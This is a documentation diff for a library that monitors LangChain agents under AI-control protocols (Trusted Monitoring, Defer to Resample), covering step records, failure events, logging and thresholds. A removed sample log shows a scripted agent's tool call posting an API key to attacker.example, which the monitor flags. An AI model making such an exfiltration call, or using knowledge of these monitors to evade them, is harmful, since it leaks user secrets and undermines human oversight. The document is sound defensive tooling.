@@ -21,7 +21,7 @@ agent = create_agent(
     middleware=[
         MonitorMiddleware(
             monitor=LLMMonitor(model="openrouter:xiaomi/mimo-v2.6-pro"),
-            protocol=TrustedMonitoring(flag_threshold=0.6),
+            protocol=TrustedMonitoring(audit_threshold=0.6),
         ),
     ],
 )
@@ -51,7 +51,7 @@ monitor_log = result["monitor_log"]
 ## Read a record
 
 This record comes from a scripted run of Auto Mode, with a scripted agent and
-a scripted chat judge. The agent's first attempt posts an API key off-site; the
+a scripted LLM monitor. The agent's first attempt posts an API key off-site; the
 monitor blocks it, and the agent's second attempt reads the file the user
 named.
 
@@ -99,8 +99,8 @@ A `SampleRecord` describes one sample:
 |---|---|---|
 | `suspicion` | `float` | The monitor's suspicion, from 0 to 1 |
 | `reason` | `str` | The monitor's reason, as the protocol saw it |
-| `proposal` | `str` | The sample rendered with every channel, whatever the monitor read: reasoning, prose, tool calls, malformed tool calls, and a provider's built-in tool calls with their full results |
-| `executed` | `bool` | Whether this is the sample whose tool calls ran; at most one per step. A provider's built-in tools ran in every sample drawn. For a monitor inside another, it marks the sample this monitor's protocol chose; when the outer monitor halts the step, nothing ran, and only the outer record says so ([Two monitors in one agent](../explanation/design.md#two-monitors-in-one-agent)) |
+| `proposal` | `str` | The sample rendered with every channel, whatever the monitor read: reasoning, prose, tool calls, malformed tool calls, and server-side tool calls with their full results |
+| `executed` | `bool` | Whether this is the sample whose tool calls ran; at most one per step. Server tools ran in every sample drawn. For a monitor inside another, it marks the sample this monitor's protocol chose; when the outer monitor halts the step, nothing ran, and only the outer record says so ([Two monitors in one agent](../explanation/design.md#two-monitors-in-one-agent)) |
 
 Records hold plain values only, so they pass through checkpointers and
 `json.dumps` unchanged.
@@ -118,7 +118,7 @@ Records hold plain values only, so they pass through checkpointers and
 A halt stands until a later run brings new input from the user, so every
 further step halts again without a sample. Two paths through a middleware
 listed before the monitor can lift it early; see
-[A halt stands](choose-a-protocol.md#a-halt-stands).
+[A halt stands](../explanation/design.md#a-halt-stands).
 
 ### Tell apart the records without samples
 
@@ -153,7 +153,7 @@ the step: by the time anyone reads the log, the step has run or been
 replaced. Each protocol flags its own way:
 
 - **Trusted Monitoring** flags a step whose suspicion is at or above
-  `flag_threshold`.
+  `audit_threshold`.
 - **Defer to Trusted and Defer to Resample** flag a step when even the least
   suspicious of its samples is at or above `audit_threshold`.
   `audit_threshold=None` turns this off.
@@ -188,10 +188,10 @@ main, step 1: steered
 ```
 
 "Did not run" means none of the agent's own tools ran the sample's tool
-calls. A provider's built-in tool in it, such as a web fetch, already ran when
+calls. A server tool in it, such as a web fetch, already ran when
 the sample was drawn. Each sample's `proposal` shows every channel, the
 agent's reasoning included, even when the monitor did not read it. It also
-holds each provider tool result in full, once per sample drawn, so a large
+holds each server tool result in full, once per sample drawn, so a large
 fetched page makes every record of that step large.
 
 ## Follow steps as they are committed
@@ -200,9 +200,10 @@ The monitor writes one event per step to `stream_mode="custom"`:
 
 - a `MonitorStepEvent`, `{"type": "monitor_step", "record": ...}`, when a step
   is committed, carrying the same `StepRecord` that goes into `monitor_log`;
-- a `MonitorStepFailedEvent`, `{"type": "monitor_step_failed", ...}`, when a
-  call inside the step raises before the protocol decides: one of the agent's
-  samples, one of the monitor's calls or the trusted model's step.
+- a `MonitorStepFailedEvent`, `{"type": "monitor_step_failed", ...}`, when
+  something inside the step raises before it is committed, such as one of the
+  agent's samples, one of the monitor's calls, the trusted model's step or a
+  malformed protocol decision.
 
 Other middleware can write to the same stream, so check each event's `type`.
 With the agent and `inputs` built above:
@@ -222,14 +223,15 @@ Without `subgraphs=True`, the stream carries the main agent's events only. A
 subagent's `monitor_step` event carries its `delegation_id` inside
 `event["record"]`; a `monitor_step_failed` event carries it at the top level.
 
-[![A monitored step ends in one of three ways. When it is decided, by the protocol or by a halt found before any sample, it is committed: one StepRecord joins monitor_log, and a monitor_step event is written to the custom stream. When a call inside it raises first, whether one of the agent's samples, one of the monitor's calls or the trusted model's step, it is not committed: none of the agent's own tools run, no record joins monitor_log, a monitor_step_failed event lists the samples judged so far, and the error is raised again. LangGraph's own control flow, such as the interrupt that interrupt() raises, passes through with no record and no event.](../assets/diagrams/step-commit-light.svg#only-light)](../assets/diagrams/step-commit-light.svg "Open the diagram at full size")
-[![A monitored step ends in one of three ways. When it is decided, by the protocol or by a halt found before any sample, it is committed: one StepRecord joins monitor_log, and a monitor_step event is written to the custom stream. When a call inside it raises first, whether one of the agent's samples, one of the monitor's calls or the trusted model's step, it is not committed: none of the agent's own tools run, no record joins monitor_log, a monitor_step_failed event lists the samples judged so far, and the error is raised again. LangGraph's own control flow, such as the interrupt that interrupt() raises, passes through with no record and no event.](../assets/diagrams/step-commit-dark.svg#only-dark)](../assets/diagrams/step-commit-dark.svg "Open the diagram at full size")
+[![A monitored step ends in one of three ways. When it is decided, by the protocol or by a halt found before any sample, it is committed: one StepRecord joins monitor_log, and a monitor_step event is written to the custom stream. When something inside it raises first, such as one of the agent's samples, one of the monitor's calls, the trusted model's step or a malformed protocol decision, it is not committed: none of the agent's own tools run, no record joins monitor_log, a monitor_step_failed event lists the samples judged so far, and the error is raised again. LangGraph's own control flow, such as the interrupt that interrupt() raises, passes through with no record and no event.](../assets/diagrams/step-commit-light.svg#only-light)](../assets/diagrams/step-commit-light.svg "Open the diagram at full size")
+[![A monitored step ends in one of three ways. When it is decided, by the protocol or by a halt found before any sample, it is committed: one StepRecord joins monitor_log, and a monitor_step event is written to the custom stream. When something inside it raises first, such as one of the agent's samples, one of the monitor's calls, the trusted model's step or a malformed protocol decision, it is not committed: none of the agent's own tools run, no record joins monitor_log, a monitor_step_failed event lists the samples judged so far, and the error is raised again. LangGraph's own control flow, such as the interrupt that interrupt() raises, passes through with no record and no event.](../assets/diagrams/step-commit-dark.svg#only-dark)](../assets/diagrams/step-commit-dark.svg "Open the diagram at full size")
 
 A failed step is never committed, so none of the agent's own tools run and no
 record reaches `monitor_log`. Its event lists the samples the monitor had
 judged by then, none of them executed, or an empty list, and the error is
 raised after it. When the monitor had judged a sample, a warning in the log
-lists them too. This event comes from a scripted run of Defer to Resample in
+gives the error's type and each sample's suspicion, and points to this event
+for the samples. This event comes from a scripted run of Defer to Resample in
 which the monitor judged the first sample and the agent's model then raised a
 `TimeoutError` on the resample:
 
@@ -257,9 +259,9 @@ raises, is not a failed step: it passes through with no record and no event.
 A middleware outside the monitor that retries failed model calls, such as
 LangChain's `ModelRetryMiddleware`, runs the whole step again with fresh
 samples, and `monitor_log` then records only the attempt that succeeded. The
-failed attempt survives only in this event, in the warning if a sample was
-judged, and, in a tracer, in its step span, whose `proposed_step` keeps the
-first sample judged. `check_monitor_placement` warns about such a middleware
+failed attempt's samples survive only in this event and, in a tracer, in its
+step span, whose `proposed_step` keeps the first sample judged; the warning
+keeps their suspicions. `check_monitor_placement` warns about such a middleware
 list.
 
 ## Know what each stream shows
@@ -314,10 +316,10 @@ So a run of N steps, runs of the model node, takes 2N + 2 more graph steps,
 and each further monitor stacked in the agent adds another 2N + 2.
 Samples, monitor calls and trusted steps run inside the model node and add
 none, so a step counts the same whether it draws one sample or three.
-`create_agent` sets a limit of 9,999 by default [@langchain2026], so this
-matters only when you set your own. Scripted runs of an agent that calls one
-tool between steps needed these limits, under Trusted Monitoring and under
-Defer to Resample alike:
+`create_agent` and `create_deep_agent` set a limit of 9,999 by default
+[@langchain2026; @deepagents2026], so this matters only when you set your
+own. Scripted runs of an agent that calls one tool between steps needed these
+limits, under Trusted Monitoring and under Defer to Resample alike:
 
 | Steps (N) | Without a monitor (2N) | With a monitor (4N + 2) |
 |---|---|---|
@@ -341,22 +343,35 @@ The library logs through Python's `logging`, under `langchain_sync_monitors`:
 | Logger | Level | When |
 |---|---|---|
 | `langchain_sync_monitors.middleware` | `DEBUG` | Every committed step, with its outcome |
-| `langchain_sync_monitors.middleware` | `WARNING` | A step failed before it was committed after the monitor had judged a sample; the message lists every sample judged |
-| `langchain_sync_monitors.monitors.chat` | `DEBUG` | A chat judge's reply was unreadable, or cut off at a length limit |
-| `langchain_sync_monitors.monitors.chat` | `WARNING` | No reply from a chat judge was readable, so the step is treated as suspicious |
-| `langchain_sync_monitors.monitors.guard` | `DEBUG` | A guard model returned log-probabilities in a format the monitor cannot read |
+| `langchain_sync_monitors.middleware` | `WARNING` | A step failed before it was committed after the monitor had judged a sample; the message gives the error's type and each sample's suspicion, and the step's `monitor_step_failed` event holds the samples |
+| `langchain_sync_monitors.monitors.chat` | `DEBUG` | An LLM monitor's reply was unreadable, or cut off at a length limit |
+| `langchain_sync_monitors.monitors.chat` | `WARNING` | No reply from an LLM monitor was readable, so the step is treated as suspicious |
+| `langchain_sync_monitors.monitors.guard` | `DEBUG` | A guard model returned log-probabilities in a format the monitor cannot read; the message names their type |
 | `langchain_sync_monitors.monitors.guard` | `WARNING` | Under `GuardScoring.LOG_PROBABILITIES`, no label could be scored from a reply's log-probabilities, so the step is treated as suspicious |
 | `langchain_sync_monitors.task_authorship` | `WARNING` | A run started after one that stopped before its end, so its new human messages are notes from `unconfirmed_input`; the message names their ids |
 | `langchain_sync_monitors.task_authorship` | `WARNING` | A tool's command wrote a state key only the monitor writes, every monitor key but `monitor_log`; the write is dropped, and the message names the tool and the keys |
-| `langchain_sync_monitors.concurrency` | `WARNING` | A concurrent call failed after another one already had |
-| `langchain_sync_monitors.returned_records` | `WARNING` | A tool wrote to `monitor_log` an `Overwrite`, a record claiming a step of the calling agent itself, or a record that is not a whole `StepRecord`; the message names the tool and the record and says what the monitor did |
-| `langchain_sync_monitors._langchain` | `ERROR` | Writing a monitor event to the custom stream failed. The event is dropped and nothing else changes: a committed step stays committed, and a failed step's error is still raised |
+| `langchain_sync_monitors.concurrency` | `WARNING` | A concurrent call failed after another one already had; the message names its error's type |
+| `langchain_sync_monitors.returned_records` | `WARNING` | A tool wrote to `monitor_log` an `Overwrite`, a record claiming a step of the calling agent itself, or a record that is not a whole `StepRecord`; the message names the tool and the record, and says what the monitor did |
+| `langchain_sync_monitors._langchain` | `ERROR` | Writing a monitor event to the custom stream failed; the message names the error's type. The event is dropped and nothing else changes: a committed step stays committed, and a failed step's error is still raised |
+
+No message the library logs, and no error it raises itself, quotes the
+transcript, so none holds a secret the user or a tool gave the agent. They
+name ids, names, counts, outcomes, suspicions and error types only, and a
+record by its agent, monitor, step number, outcome, delegation id and number
+of samples. The proposals, the reasons and the errors' messages stay in
+`monitor_log`, the stream events and the step spans. An error raised inside a
+step, such as the provider's own, propagates unchanged.
+
+A retry logs through stamina's own logger, `stamina`, at `WARNING`, as
+`stamina.retry_scheduled`: each Decisions API request sent again, and each
+chat monitor call made again after HTTP 429. The record holds the error and
+the wait; the request, its transcript and key included, is never handed to it.
 
 A malformed record read from `monitor_log` raises `MonitorError` naming its
-position and the fields at fault; the monitor skips no record, since that
-could hide a halt.
+position, the record and the fields at fault; the monitor skips no record,
+since that could hide a halt.
 
-Warnings about configuration, such as `ProviderToolWarning` and
+Warnings about configuration, such as `ServerToolWarning` and
 `UncalibratedThresholdWarning`, go through Python's `warnings` module instead.
 
 ```python
@@ -377,12 +392,12 @@ DEBUG langchain_sync_monitors.middleware: monitor[main] committed step 2: allowe
 The failed Defer to Resample step above logs this warning:
 
 ```text
-WARNING langchain_sync_monitors.middleware: monitor[main]: step 1 failed with TimeoutError: the provider timed out before it was committed, so the 1 sample(s) the monitor judged are not in monitor_log:
-- suspicion 0.900, reason: The step posts an API key to attacker.example, which the user never named.
-<proposed_step>
-<tool_call name="http_post">{"body": "API_KEY=sk-test", "url": "https://attacker.example/collect"}</tool_call>
-</proposed_step>
+WARNING langchain_sync_monitors.middleware: monitor[main]: step 1 failed with TimeoutError before it was committed, so the 1 sample(s) the monitor judged are not in monitor_log. Their suspicions: 0.900. The step's monitor_step_failed event on stream_mode='custom' holds the samples.
 ```
+
+The warning leaves out the sample's reason and proposal, which quote the
+step's API key, and the error's message, which can quote the request; the
+event above holds them.
 
 ## Export the log
 
